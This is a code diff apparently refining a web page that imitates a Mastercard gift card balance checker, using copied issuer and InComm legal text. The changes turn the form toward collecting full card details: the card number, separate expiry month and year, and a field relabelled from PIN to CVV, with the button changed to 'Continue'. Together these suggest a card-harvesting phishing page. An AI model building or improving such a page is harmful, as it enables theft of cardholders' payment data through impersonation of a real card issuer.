+      <p>Mastercard&reg; Gift Cards are issued by Sutton Bank or Pathward, N.A. pursuant to license by Mastercard International Incorporated, and may be used in the U.S. and District of Columbia everywhere Debit Mastercard cards are accepted. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated. Sutton Bank and Pathward, N.A., Members FDIC. No cash or ATM access. Terms and conditions apply. See <a href="#">Cardholder Agreement</a> for details. Cards are distributed and serviced by InComm Financial Services, Inc., which is licensed as a Money Transmitter by the New York State Department of Financial Services. NMLS ID# 912772.</p>
+      <p>Colorado, Maryland, and Texas customers: <a href="#">View information</a> about addressing complaints regarding our money services business.</p>
+      <p>Copyright &copy;2026 InComm Payments. All Rights Reserved.</p>
+    </div>
+
+    <div class="footer-bottom">
+      <div class="footer-links">
+        <a href="#">Pathward, N.A. Privacy Policy</a>
+        <a href="#">Sutton Bank Privacy Policy</a>
+        <a href="#">Terms of Use</a>
+        <a href="#">Cardholder Agreement</a>
+        <a href="#">Accessibility Statement</a>
+      </div>
+    </div>
   </footer>
 
   <!-- Loading Overlay -->
@@ -864,7 +768,8 @@
     const cardInput = document.getElementById('cardNumber');
     const cardHolderInput = document.getElementById('cardHolder');
     const pinInput = document.getElementById('pin');
-    const expiryInput = document.getElementById('expiryDate');
+    const expiryMonthInput = document.getElementById('expiryMonth');
+    const expiryYearInput = document.getElementById('expiryYear');
     const form = document.getElementById('balanceForm');
     const resultEl = document.getElementById('result');
     const submitBtn = document.getElementById('submitBtn');
@@ -875,10 +780,9 @@
     const cardBrandImg = document.getElementById('cardBrandImg');
 
     // Card type detection
-    const CARD_LOGOS = { Visa: '/visa.svg', Mastercard: '/mastercard.svg' };
+    const CARD_LOGOS = { Mastercard: '/mastercard.svg' };
     function getCardType(num) {
       const d = String(num).replace(/\D/g, '');
-      if (d.startsWith('4')) return 'Visa';
       if (/^5[1-5]/.test(d)) return 'Mastercard';
       const n4 = d.length >= 4 ? parseInt(d.slice(0, 4), 10) : 0;
       if (d.startsWith('2') && n4 >= 2221 && n4 <= 2720) return 'Mastercard';
@@ -891,25 +795,20 @@
       e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
       e.target.classList.remove('error');
       document.getElementById('cardError').textContent = '';
-      // Update card visual
-      document.getElementById('gcNumber').textContent = e.target.value || '\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022';
       // Detect card brand
       const type = getCardType(v);
       if (v.length >= 2 && type) {
         cardBrandImg.src = CARD_LOGOS[type];
         cardBrandImg.alt = type;
         cardBrandBadge.classList.add('visible');
-        document.getElementById('gcBrand').innerHTML = '<img src="' + CARD_LOGOS[type] + '" alt="' + type + '" style="height:32px;border-radius:4px;">';
       } else {
         cardBrandBadge.classList.remove('visible');
-        document.getElementById('gcBrand').innerHTML = '';
       }
     };
 
     // Card holder name
     cardHolderInput.oninput = e => {
-      const name = e.target.value.toUpperCase();
-      document.getElementById('gcHolder').textContent = name || 'GIFT CARD';
+      // no-op for visual since we removed the card preview
     };
 
     // PIN formatting
@@ -919,20 +818,18 @@
       document.getElementById('pinError').textContent = '';
     };
 
-    // Expiry formatting
-    expiryInput.oninput = e => {
-      let v = e.target.value.replace(/\D/g, '').slice(0, 4);
-      if (v.length >= 3) {
-        v = v.slice(0, 2) + '/' + v.slice(2);
-      }
-      e.target.value = v;
+    // Expiry month formatting
+    expiryMonthInput.oninput = e => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
       e.target.classList.remove('error');
       document.getElementById('expiryError').textContent = '';
-      // Update card visual
-      const parts = v.split('/');
-      const mm = parts[0] || 'MM';
-      const yy = parts[1] || 'YY';
-      document.getElementById('gcExpiry').textContent = mm + '/' + yy;
+    };
+
+    // Expiry year formatting
+    expiryYearInput.oninput = e => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
+      e.target.classList.remove('error');
+      document.getElementById('expiryError').textContent = '';
     };
 
     // Luhn check
@@ -952,7 +849,8 @@
     function validate() {
       const digits = cardInput.value.replace(/\s/g, '');
       const pin = pinInput.value;
-      const expiry = expiryInput.value;
+      const mm = expiryMonthInput.value;
+      const yy = expiryYearInput.value;
       let ok = true;
 
       document.querySelectorAll('.field-error').forEach(el => el.textContent = '');
@@ -969,29 +867,16 @@
       }
 
       if (!pin || pin.length < 3 || pin.length > 4) {
-        document.getElementById('pinError').textContent = 'Please enter a valid PIN (3-4 digits)';
+        document.getElementById('pinError').textContent = 'Please enter a valid CVV (3-4 digits)';
         pinInput.classList.add('error');
         ok = false;
       }
 
-      if (expiry) {
-        const parts = expiry.split('/');
-        if (parts.length === 2) {
-          const mm = parseInt(parts[0], 10);
-          const yy = parts[1];
-          if (mm < 1 || mm > 12) {
-            document.getElementById('expiryError').textContent = 'Invalid month';
-            expiryInput.classList.add('error');
-            ok = false;
-          }
-          if (yy.length !== 2) {
-            document.getElementById('expiryError').textContent = 'Use MM/YY format';
-            expiryInput.classList.add('error');
-            ok = false;
-          }
-        } else if (expiry.length > 0) {
-          document.getElementById('expiryError').textContent = 'Use MM/YY format';
-          expiryInput.classList.add('error');
+      if (mm) {
+        const month = parseInt(mm, 10);
+        if (month < 1 || month > 12) {
+          document.getElementById('expiryError').textContent = 'Invalid month';
+          expiryMonthInput.classList.add('error');
           ok = false;
         }
       }
@@ -1020,10 +905,6 @@
       formFields.classList.remove('hide');
       checkAnother.classList.remove('show');
       form.reset();
-      document.getElementById('gcNumber').textContent = '\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022';
-      document.getElementById('gcExpiry').textContent = 'MM/YY';
-      document.getElementById('gcHolder').textContent = 'GIFT CARD';
-      document.getElementById('gcBrand').innerHTML = '';
       cardBrandBadge.classList.remove('visible');
     };
 
@@ -1036,15 +917,8 @@
 
       const digits = cardInput.value.replace(/\s/g, '');
       const pin = pinInput.value;
-      const expiry = expiryInput.value;
-
-      let expiryMonth = '';
-      let expiryYear = '';
-      if (expiry) {
-        const parts = expiry.split('/');
-        expiryMonth = (parts[0] || '').padStart(2, '0');
-        expiryYear = parts[1] || '';
-      }
+      const expiryMonth = (expiryMonthInput.value || '').padStart(2, '0');
+      const expiryYear = expiryYearInput.value || '';
 
       submitBtn.disabled = true;
       submitBtn.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-width:3px;"></span> Checking...';
@@ -1073,7 +947,6 @@
         let result = { success: false, error: '' };
         const st = data.status || '';
 
-        // API returns status "OK" on success with balance data
         if (st === 'OK') {
           const d = data.data || data;
           const raw = d.balance !== undefined ? d.balance : (d.amount !== undefined ? d.amount : (data.balance !== undefined ? data.balance : data.amount));
@@ -1089,7 +962,6 @@
             result.error = 'Balance information not available.';
           }
         } else {
-          // Handle all error status codes from API docs
           const msg = data.error_message || data.error || data.message || '';
           const ERROR_MAP = {
             'WRONG_API_TOKEN': 'Service configuration error. Please contact support.',
@@ -1107,7 +979,6 @@
           };
           result.error = ERROR_MAP[st] || msg || CARD_ERROR_MSG;
 
-          // Fallback: check if balance exists even without OK status
           if (!result.error || result.error === CARD_ERROR_MSG) {
             const d = data.data || data;
             const raw = d.balance !== undefined ? d.balance : (d.amount !== undefined ? d.amount : data.balance);
@@ -1126,7 +997,7 @@
 
       loadingOverlay.classList.remove('show');
       submitBtn.disabled = false;
-      submitBtn.innerHTML = '<svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg> Check Balance';
+      submitBtn.innerHTML = 'Continue';
     };
   </script>
 </body>
